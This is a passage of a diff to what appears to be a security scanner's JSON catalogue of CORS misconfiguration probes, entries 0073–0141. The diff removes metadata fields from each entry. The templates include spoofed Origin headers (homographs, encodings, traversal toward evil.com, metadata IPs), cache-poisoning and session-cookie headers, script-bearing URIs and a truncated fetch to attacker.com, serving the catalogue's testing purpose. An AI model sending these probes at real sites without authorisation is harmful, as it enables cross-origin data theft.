-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "WebSocket CORS bypass probe from OWASP. Tests application handling of: fetch('https://attacker.com/lo..."
   },
   {
     "id": "cors-misconfiguration-owasp-0074",
     "name": "Origin with credentials",
     "template": "Origin: https://user:pass@target.com",
-    "description": "Origin with credentials probe from OWASP. Tests application handling of: Origin: https://user:pass@targ...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Origin with credentials probe from OWASP. Tests application handling of: Origin: https://user:pass@targ..."
   },
   {
     "id": "cors-misconfiguration-owasp-0075",
     "name": "Origin with credentials #2",
     "template": "Origin: https://admin@target.com",
-    "description": "Origin with credentials probe from OWASP. Tests application handling of: Origin: https://admin@target.c...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Origin with credentials probe from OWASP. Tests application handling of: Origin: https://admin@target.c..."
   },
   {
     "id": "cors-misconfiguration-owasp-0076",
     "name": "Homograph attacks (IDN)",
     "template": "Origin: https://t\u0430rget.com  # Cyrillic '\u0430'",
-    "description": "Homograph attacks (IDN) probe from OWASP. Tests application handling of: Origin: https://t\u0430rget.com  # ...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Homograph attacks (IDN) probe from OWASP. Tests application handling of: Origin: https://t\u0430rget.com  # ..."
   },
   {
     "id": "cors-misconfiguration-owasp-0077",
     "name": "Homograph attacks (IDN) #2",
     "template": "Origin: https://t\u0430rg\u0435t.com  # Cyrillic '\u0430' and '\u0435'",
-    "description": "Homograph attacks (IDN) probe from OWASP. Tests application handling of: Origin: https://t\u0430rg\u0435t.com  # ...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Homograph attacks (IDN) probe from OWASP. Tests application handling of: Origin: https://t\u0430rg\u0435t.com  # ..."
   },
   {
     "id": "cors-misconfiguration-owasp-0078",
     "name": "Homograph attacks (IDN) #3",
     "template": "Origin: https://targ\u0435t.com  # Cyrillic '\u0435'",
-    "description": "Homograph attacks (IDN) probe from OWASP. Tests application handling of: Origin: https://targ\u0435t.com  # ...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Homograph attacks (IDN) probe from OWASP. Tests application handling of: Origin: https://targ\u0435t.com  # ..."
   },
   {
     "id": "cors-misconfiguration-owasp-0079",
     "name": "Bypass via special TLDs",
     "template": "Origin: https://target.com.local",
-    "description": "Bypass via special TLDs probe from OWASP. Tests application handling of: Origin: https://target.com.loc...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Bypass via special TLDs probe from OWASP. Tests application handling of: Origin: https://target.com.loc..."
   },
   {
     "id": "cors-misconfiguration-owasp-0080",
     "name": "Bypass via special TLDs #2",
     "template": "Origin: https://target.com.internal",
-    "description": "Bypass via special TLDs probe from OWASP. Tests application handling of: Origin: https://target.com.int...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Bypass via special TLDs probe from OWASP. Tests application handling of: Origin: https://target.com.int..."
   },
   {
     "id": "cors-misconfiguration-owasp-0081",
     "name": "Bypass via special TLDs #3",
     "template": "Origin: https://target.com.corp",
-    "description": "Bypass via special TLDs probe from OWASP. Tests application handling of: Origin: https://target.com.cor...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Bypass via special TLDs probe from OWASP. Tests application handling of: Origin: https://target.com.cor..."
   },
   {
     "id": "cors-misconfiguration-owasp-0082",
     "name": "IPv6 localhost variations",
     "template": "Origin: http://[0:0:0:0:0:0:0:1]",
-    "description": "IPv6 localhost variations probe from OWASP. Tests application handling of: Origin: http://[0:0:0:0:0:0:0:...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "IPv6 localhost variations probe from OWASP. Tests application handling of: Origin: http://[0:0:0:0:0:0:0:..."
   },
   {
     "id": "cors-misconfiguration-owasp-0083",
     "name": "IPv6 localhost variations #2",
     "template": "Origin: http://[0:0:0:0:0:0:0:0]",
-    "description": "IPv6 localhost variations probe from OWASP. Tests application handling of: Origin: http://[0:0:0:0:0:0:0:...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "IPv6 localhost variations probe from OWASP. Tests application handling of: Origin: http://[0:0:0:0:0:0:0:..."
   },
   {
     "id": "cors-misconfiguration-owasp-0084",
     "name": "IPv6 localhost variations #3",
     "template": "Origin: http://[::ffff:127.0.0.1]",
-    "description": "IPv6 localhost variations probe from OWASP. Tests application handling of: Origin: http://[::ffff:127.0.0...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "IPv6 localhost variations probe from OWASP. Tests application handling of: Origin: http://[::ffff:127.0.0..."
   },
   {
     "id": "cors-misconfiguration-owasp-0085",
     "name": "Private IP ranges",
     "template": "Origin: http://192.168.1.1",
-    "description": "Private IP ranges probe from OWASP. Tests application handling of: Origin: http://192.168.1.1",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Private IP ranges probe from OWASP. Tests application handling of: Origin: http://192.168.1.1"
   },
   {
     "id": "cors-misconfiguration-owasp-0086",
     "name": "Private IP ranges #2",
     "template": "Origin: http://10.0.0.1",
-    "description": "Private IP ranges probe from OWASP. Tests application handling of: Origin: http://10.0.0.1",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Private IP ranges probe from OWASP. Tests application handling of: Origin: http://10.0.0.1"
   },
   {
     "id": "cors-misconfiguration-owasp-0087",
     "name": "Private IP ranges #3",
     "template": "Origin: http://172.16.0.1",
-    "description": "Private IP ranges probe from OWASP. Tests application handling of: Origin: http://172.16.0.1",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Private IP ranges probe from OWASP. Tests application handling of: Origin: http://172.16.0.1"
   },
   {
     "id": "cors-misconfiguration-owasp-0088",
     "name": "Private IP ranges #4",
     "template": "Origin: http://169.254.169.254",
-    "description": "Private IP ranges probe from OWASP. Tests application handling of: Origin: http://169.254.169.254",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Private IP ranges probe from OWASP. Tests application handling of: Origin: http://169.254.169.254"
   },
   {
     "id": "cors-misconfiguration-owasp-0089",
     "name": "CORS with reflected subdomains",
     "template": "Origin: https://xss.target.com",
-    "description": "CORS with reflected subdomains probe from OWASP. Tests application handling of: Origin: https://xss.target.com",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "CORS with reflected subdomains probe from OWASP. Tests application handling of: Origin: https://xss.target.com"
   },
   {
     "id": "cors-misconfiguration-owasp-0090",
     "name": "CORS with reflected subdomains #2",
     "template": "Origin: https://<script>.target.com",
-    "description": "CORS with reflected subdomains probe from OWASP. Tests application handling of: Origin: https://<script>.targe...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "CORS with reflected subdomains probe from OWASP. Tests application handling of: Origin: https://<script>.targe..."
   },
   {
     "id": "cors-misconfiguration-owasp-0091",
     "name": "CORS with reflected subdomains #3",
     "template": "Origin: https://javascript:alert(1).target.com",
-    "description": "CORS with reflected subdomains probe from OWASP. Tests application handling of: Origin: https://javascript:ale...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "CORS with reflected subdomains probe from OWASP. Tests application handling of: Origin: https://javascript:ale..."
   },
   {
     "id": "cors-misconfiguration-owasp-0092",
     "name": "Bypass with URL encoding",
     "template": "Origin: https://%74%61%72%67%65%74.com",
-    "description": "Bypass with URL encoding probe from OWASP. Tests application handling of: Origin: https://%74%61%72%67%6...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Bypass with URL encoding probe from OWASP. Tests application handling of: Origin: https://%74%61%72%67%6..."
   },
   {
     "id": "cors-misconfiguration-owasp-0093",
     "name": "Bypass with URL encoding #2",
     "template": "Origin: https://target%2ecom",
-    "description": "Bypass with URL encoding probe from OWASP. Tests application handling of: Origin: https://target%2ecom",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Bypass with URL encoding probe from OWASP. Tests application handling of: Origin: https://target%2ecom"
   },
   {
     "id": "cors-misconfiguration-owasp-0094",
     "name": "Double encoding",
     "template": "Origin: https://%2574%2561%2572%2567%2565%2574.com",
-    "description": "Double encoding probe from OWASP. Tests application handling of: Origin: https://%2574%2561%257...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Double encoding probe from OWASP. Tests application handling of: Origin: https://%2574%2561%257..."
   },
   {
     "id": "cors-misconfiguration-owasp-0095",
     "name": "Unicode bypass",
     "template": "Origin: https://\u24e3\u24d0\u24e1\u24d6\u24d4\u24e3.com",
-    "description": "Unicode bypass probe from OWASP. Tests application handling of: Origin: https://\u24e3\u24d0\u24e1\u24d6\u24d4\u24e3.com",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Unicode bypass probe from OWASP. Tests application handling of: Origin: https://\u24e3\u24d0\u24e1\u24d6\u24d4\u24e3.com"
   },
   {
     "id": "cors-misconfiguration-owasp-0096",
     "name": "Unicode bypass #2",
     "template": "Origin: https://\ud835\udcfd\ud835\udcea\ud835\udcfb\ud835\udcf0\ud835\udcee\ud835\udcfd.com",
-    "description": "Unicode bypass probe from OWASP. Tests application handling of: Origin: https://\ud835\udcfd\ud835\udcea\ud835\udcfb\ud835\udcf0\ud835\udcee\ud835\udcfd.com",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Unicode bypass probe from OWASP. Tests application handling of: Origin: https://\ud835\udcfd\ud835\udcea\ud835\udcfb\ud835\udcf0\ud835\udcee\ud835\udcfd.com"
   },
   {
     "id": "cors-misconfiguration-owasp-0097",
     "name": "Testing Access-Control-Allow-Methods",
     "template": "GET /api/admin HTTP/1.1",
-    "description": "Testing Access-Control-Allow-Methods probe from OWASP. Tests application handling of: GET /api/admin HTTP/1.1",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Testing Access-Control-Allow-Methods probe from OWASP. Tests application handling of: GET /api/admin HTTP/1.1"
   },
   {
     "id": "cors-misconfiguration-owasp-0098",
     "name": "Testing Access-Control-Allow-Headers",
     "template": "Access-Control-Request-Headers: X-Admin-Token",
-    "description": "Testing Access-Control-Allow-Headers probe from OWASP. Tests application handling of: Access-Control-Request-Headers...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Testing Access-Control-Allow-Headers probe from OWASP. Tests application handling of: Access-Control-Request-Headers..."
   },
   {
     "id": "cors-misconfiguration-owasp-0099",
     "name": "Cache poisoning via CORS",
     "template": "GET /api/data HTTP/1.1",
-    "description": "Cache poisoning via CORS probe from OWASP. Tests application handling of: GET /api/data HTTP/1.1",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Cache poisoning via CORS probe from OWASP. Tests application handling of: GET /api/data HTTP/1.1"
   },
   {
     "id": "cors-misconfiguration-owasp-0100",
     "name": "Cache poisoning via CORS #2",
     "template": "X-Forwarded-Host: evil.com",
-    "description": "Cache poisoning via CORS probe from OWASP. Tests application handling of: X-Forwarded-Host: evil.com",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Cache poisoning via CORS probe from OWASP. Tests application handling of: X-Forwarded-Host: evil.com"
   },
   {
     "id": "cors-misconfiguration-owasp-0101",
     "name": "CORS with authentication bypass",
     "template": "GET /api/sensitive HTTP/1.1",
-    "description": "CORS with authentication bypass probe from OWASP. Tests application handling of: GET /api/sensitive HTTP/1.1",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "CORS with authentication bypass probe from OWASP. Tests application handling of: GET /api/sensitive HTTP/1.1"
   },
   {
     "id": "cors-misconfiguration-owasp-0102",
     "name": "CORS with authentication bypass #2",
     "template": "Cookie: session=victim_session_token",
-    "description": "CORS with authentication bypass probe from OWASP. Tests application handling of: Cookie: session=victim_session...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "CORS with authentication bypass probe from OWASP. Tests application handling of: Cookie: session=victim_session..."
   },
   {
     "id": "cors-misconfiguration-owasp-0103",
     "name": "Testing weak regex patterns",
     "template": "Origin: https://target.com.example.com",
-    "description": "Testing weak regex patterns probe from OWASP. Tests application handling of: Origin: https://target.com.exa...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Testing weak regex patterns probe from OWASP. Tests application handling of: Origin: https://target.com.exa..."
   },
   {
     "id": "cors-misconfiguration-owasp-0104",
     "name": "Testing weak regex patterns #2",
     "template": "Origin: https://example.target.com.example.com",
-    "description": "Testing weak regex patterns probe from OWASP. Tests application handling of: Origin: https://example.target...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Testing weak regex patterns probe from OWASP. Tests application handling of: Origin: https://example.target..."
   },
   {
     "id": "cors-misconfiguration-owasp-0105",
     "name": "Testing weak regex patterns #3",
     "template": "Origin: https://target_com.example.com",
-    "description": "Testing weak regex patterns probe from OWASP. Tests application handling of: Origin: https://target_com.exa...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Testing weak regex patterns probe from OWASP. Tests application handling of: Origin: https://target_com.exa..."
   },
   {
     "id": "cors-misconfiguration-owasp-0106",
     "name": "Testing weak regex patterns #4",
     "template": "Origin: https://target-com.example.com",
-    "description": "Testing weak regex patterns probe from OWASP. Tests application handling of: Origin: https://target-com.exa...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Testing weak regex patterns probe from OWASP. Tests application handling of: Origin: https://target-com.exa..."
   },
   {
     "id": "cors-misconfiguration-owasp-0107",
     "name": "Path traversal in Origin",
     "template": "Origin: https://target.com/../../evil.com",
-    "description": "Path traversal in Origin probe from OWASP. Tests application handling of: Origin: https://target.com/../...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Path traversal in Origin probe from OWASP. Tests application handling of: Origin: https://target.com/../..."
   },
   {
     "id": "cors-misconfiguration-owasp-0108",
     "name": "Path traversal in Origin #2",
     "template": "Origin: https://target.com/../evil.com",
-    "description": "Path traversal in Origin probe from OWASP. Tests application handling of: Origin: https://target.com/../...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Path traversal in Origin probe from OWASP. Tests application handling of: Origin: https://target.com/../..."
   },
   {
     "id": "cors-misconfiguration-owasp-0109",
     "name": "Fragment identifier bypass",
     "template": "Origin: https://target.com#evil.com",
-    "description": "Fragment identifier bypass probe from OWASP. Tests application handling of: Origin: https://target.com#evi...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Fragment identifier bypass probe from OWASP. Tests application handling of: Origin: https://target.com#evi..."
   },
   {
     "id": "cors-misconfiguration-owasp-0110",
     "name": "Fragment identifier bypass #2",
     "template": "Origin: https://target.com#@evil.com",
-    "description": "Fragment identifier bypass probe from OWASP. Tests application handling of: Origin: https://target.com#@ev...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Fragment identifier bypass probe from OWASP. Tests application handling of: Origin: https://target.com#@ev..."
   },
   {
     "id": "cors-misconfiguration-owasp-0111",
     "name": "Query string in Origin (invalid but test anyway)",
     "template": "Origin: https://target.com?evil.com",
-    "description": "Query string in Origin (invalid but test anyway) probe from OWASP. Tests application handling of: Origin: https://target.com?evi...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Query string in Origin (invalid but test anyway) probe from OWASP. Tests application handling of: Origin: https://target.com?evi..."
   },
   {
     "id": "cors-misconfiguration-owasp-0112",
     "name": "Query string in Origin (invalid but test anyway) #2",
     "template": "Origin: https://target.com?redirect=evil.com",
-    "description": "Query string in Origin (invalid but test anyway) probe from OWASP. Tests application handling of: Origin: https://target.com?red...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Query string in Origin (invalid but test anyway) probe from OWASP. Tests application handling of: Origin: https://target.com?red..."
   },
   {
     "id": "cors-misconfiguration-owasp-0113",
     "name": "Bypassing with trailing characters",
     "template": "Origin: https://target.com/",
-    "description": "Bypassing with trailing characters probe from OWASP. Tests application handling of: Origin: https://target.com/",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Bypassing with trailing characters probe from OWASP. Tests application handling of: Origin: https://target.com/"
   },
   {
     "id": "cors-misconfiguration-owasp-0114",
     "name": "Bypassing with trailing characters #2",
     "template": "Origin: https://target.com\\",
-    "description": "Bypassing with trailing characters probe from OWASP. Tests application handling of: Origin: https://target.com\\",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Bypassing with trailing characters probe from OWASP. Tests application handling of: Origin: https://target.com\\"
   },
   {
     "id": "cors-misconfiguration-owasp-0115",
     "name": "Bypassing with trailing characters #3",
     "template": "Origin: https://target.com;",
-    "description": "Bypassing with trailing characters probe from OWASP. Tests application handling of: Origin: https://target.com;",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Bypassing with trailing characters probe from OWASP. Tests application handling of: Origin: https://target.com;"
   },
   {
     "id": "cors-misconfiguration-owasp-0116",
     "name": "Bypassing with trailing characters #4",
     "template": "Origin: https://target.com,",
-    "description": "Bypassing with trailing characters probe from OWASP. Tests application handling of: Origin: https://target.com,",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Bypassing with trailing characters probe from OWASP. Tests application handling of: Origin: https://target.com,"
   },
   {
     "id": "cors-misconfiguration-owasp-0117",
     "name": "Mixed content bypass",
     "template": "Origin: http://target.com (when site uses HTTPS)",
-    "description": "Mixed content bypass probe from OWASP. Tests application handling of: Origin: http://target.com (whe...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Mixed content bypass probe from OWASP. Tests application handling of: Origin: http://target.com (whe..."
   },
   {
     "id": "cors-misconfiguration-owasp-0118",
     "name": "Mixed content bypass #2",
     "template": "Origin: https://target.com (when site uses HTTP)",
-    "description": "Mixed content bypass probe from OWASP. Tests application handling of: Origin: https://target.com (wh...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Mixed content bypass probe from OWASP. Tests application handling of: Origin: https://target.com (wh..."
   },
   {
     "id": "cors-misconfiguration-owasp-0119",
     "name": "Testing with data URI",
     "template": "Origin: data:text/html,<script>alert(1)</script>",
-    "description": "Testing with data URI probe from OWASP. Tests application handling of: Origin: data:text/html,<script...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Testing with data URI probe from OWASP. Tests application handling of: Origin: data:text/html,<script..."
   },
   {
     "id": "cors-misconfiguration-owasp-0120",
     "name": "Testing with javascript URI",
     "template": "Origin: javascript:alert(1)",
-    "description": "Testing with javascript URI probe from OWASP. Tests application handling of: Origin: javascript:alert(1)",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Testing with javascript URI probe from OWASP. Tests application handling of: Origin: javascript:alert(1)"
   },
   {
     "id": "cors-misconfiguration-owasp-0121",
     "name": "Origin with username",
     "template": "Origin: https://admin:password@target.com",
-    "description": "Origin with username probe from OWASP. Tests application handling of: Origin: https://admin:password...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Origin with username probe from OWASP. Tests application handling of: Origin: https://admin:password..."
   },
   {
     "id": "cors-misconfiguration-owasp-0122",
     "name": "Testing with blob URI",
     "template": "Origin: blob:https://target.com/uuid",
-    "description": "Testing with blob URI probe from OWASP. Tests application handling of: Origin: blob:https://target.co...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Testing with blob URI probe from OWASP. Tests application handling of: Origin: blob:https://target.co..."
   },
   {
     "id": "cors-misconfiguration-owasp-0123",
     "name": "Custom protocol",
     "template": "Origin: custom://target.com",
-    "description": "Custom protocol probe from OWASP. Tests application handling of: Origin: custom://target.com",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Custom protocol probe from OWASP. Tests application handling of: Origin: custom://target.com"
   },
   {
     "id": "cors-misconfiguration-owasp-0124",
     "name": "Custom protocol #2",
     "template": "Origin: app://target.com",
-    "description": "Custom protocol probe from OWASP. Tests application handling of: Origin: app://target.com",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Custom protocol probe from OWASP. Tests application handling of: Origin: app://target.com"
   },
   {
     "id": "cors-misconfiguration-owasp-0125",
     "name": "Testing max-age for preflight",
     "template": "Access-Control-Max-Age: 86400",
-    "description": "Testing max-age for preflight probe from OWASP. Tests application handling of: Access-Control-Max-Age: 86400",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Testing max-age for preflight probe from OWASP. Tests application handling of: Access-Control-Max-Age: 86400"
   },
   {
     "id": "cors-misconfiguration-owasp-0126",
     "name": "Wildcard with specific paths",
     "template": "Origin: https://evil.com/api/public",
-    "description": "Wildcard with specific paths probe from OWASP. Tests application handling of: Origin: https://evil.com/api/p...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Wildcard with specific paths probe from OWASP. Tests application handling of: Origin: https://evil.com/api/p..."
   },
   {
     "id": "cors-misconfiguration-owasp-0127",
     "name": "Testing exposed headers",
     "template": "Access-Control-Expose-Headers: Authorization, X-API-Key",
-    "description": "Testing exposed headers probe from OWASP. Tests application handling of: Access-Control-Expose-Headers:...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Testing exposed headers probe from OWASP. Tests application handling of: Access-Control-Expose-Headers:..."
   },
   {
     "id": "cors-misconfiguration-owasp-0128",
     "name": "CORS on error pages",
     "template": "GET /404 HTTP/1.1",
-    "description": "CORS on error pages probe from OWASP. Tests application handling of: GET /404 HTTP/1.1",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "CORS on error pages probe from OWASP. Tests application handling of: GET /404 HTTP/1.1"
   },
   {
     "id": "cors-misconfiguration-owasp-0129",
     "name": "CORS on redirect",
     "template": "GET /redirect HTTP/1.1",
-    "description": "CORS on redirect probe from OWASP. Tests application handling of: GET /redirect HTTP/1.1",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "CORS on redirect probe from OWASP. Tests application handling of: GET /redirect HTTP/1.1"
   },
   {
     "id": "cors-misconfiguration-owasp-0130",
     "name": "Exploiting wildcard subdomains",
     "template": "Origin: https://attacker-controlled.target.com",
-    "description": "Exploiting wildcard subdomains probe from OWASP. Tests application handling of: Origin: https://attacker-contr...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Exploiting wildcard subdomains probe from OWASP. Tests application handling of: Origin: https://attacker-contr..."
   },
   {
     "id": "cors-misconfiguration-owasp-0131",
     "name": "Exploiting wildcard subdomains #2",
     "template": "Origin: https://s3bucket.target.com",
-    "description": "Exploiting wildcard subdomains probe from OWASP. Tests application handling of: Origin: https://s3bucket.targe...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Exploiting wildcard subdomains probe from OWASP. Tests application handling of: Origin: https://s3bucket.targe..."
   },
   {
     "id": "cors-misconfiguration-owasp-0132",
     "name": "Exploiting wildcard subdomains #3",
     "template": "Origin: https://malicious.pages.target.com",
-    "description": "Exploiting wildcard subdomains probe from OWASP. Tests application handling of: Origin: https://malicious.page...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Exploiting wildcard subdomains probe from OWASP. Tests application handling of: Origin: https://malicious.page..."
   },
   {
     "id": "cors-misconfiguration-owasp-0133",
     "name": "Testing JSONP with CORS",
     "template": "GET /api/data?callback=alert HTTP/1.1",
-    "description": "Testing JSONP with CORS probe from OWASP. Tests application handling of: GET /api/data?callback=alert H...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Testing JSONP with CORS probe from OWASP. Tests application handling of: GET /api/data?callback=alert H..."
   },
   {
     "id": "cors-misconfiguration-owasp-0134",
     "name": "WebRTC CORS bypass",
     "template": "var pc = new RTCPeerConnection();",
-    "description": "WebRTC CORS bypass probe from OWASP. Tests application handling of: var pc = new RTCPeerConnection...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "WebRTC CORS bypass probe from OWASP. Tests application handling of: var pc = new RTCPeerConnection..."
   },
   {
     "id": "cors-misconfiguration-owasp-0135",
     "name": "WebRTC CORS bypass #2",
     "template": "pc.createDataChannel('');",
-    "description": "WebRTC CORS bypass probe from OWASP. Tests application handling of: pc.createDataChannel('');",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "WebRTC CORS bypass probe from OWASP. Tests application handling of: pc.createDataChannel('');"
   },
   {
     "id": "cors-misconfiguration-owasp-0136",
     "name": "WebRTC CORS bypass #3",
     "template": "pc.createOffer().then(offer => pc.setLocalDescription(offer));",
-    "description": "WebRTC CORS bypass probe from OWASP. Tests application handling of: pc.createOffer().then(offer =>...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "WebRTC CORS bypass probe from OWASP. Tests application handling of: pc.createOffer().then(offer =>..."
   },
   {
     "id": "cors-misconfiguration-owasp-0137",
     "name": "Service Worker CORS",
     "template": "self.addEventListener('fetch', event => {",
-    "description": "Service Worker CORS probe from OWASP. Tests application handling of: self.addEventListener('fetch',...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Service Worker CORS probe from OWASP. Tests application handling of: self.addEventListener('fetch',..."
   },
   {
     "id": "cors-misconfiguration-owasp-0138",
     "name": "Service Worker CORS #2",
     "template": "event.respondWith(",
-    "description": "Service Worker CORS probe from OWASP. Tests application handling of: event.respondWith(",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Service Worker CORS probe from OWASP. Tests application handling of: event.respondWith("
   },
   {
     "id": "cors-misconfiguration-owasp-0139",
     "name": "Service Worker CORS #3",
     "template": "fetch(event.request.url, {",
-    "description": "Service Worker CORS probe from OWASP. Tests application handling of: fetch(event.request.url, {",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Service Worker CORS probe from OWASP. Tests application handling of: fetch(event.request.url, {"
   },
   {
     "id": "cors-misconfiguration-owasp-0140",
     "name": "Service Worker CORS #4",
     "template": "mode: 'cors',",
-    "description": "Service Worker CORS probe from OWASP. Tests application handling of: mode: 'cors',",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Service Worker CORS probe from OWASP. Tests application handling of: mode: 'cors',"
   },
   {
     "id": "cors-misconfiguration-owasp-0141",
     "name": "Service Worker CORS #5",
     "template": "})",
-    "description": "Service Worker CORS probe from OWASP. Tests application handling of: })",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
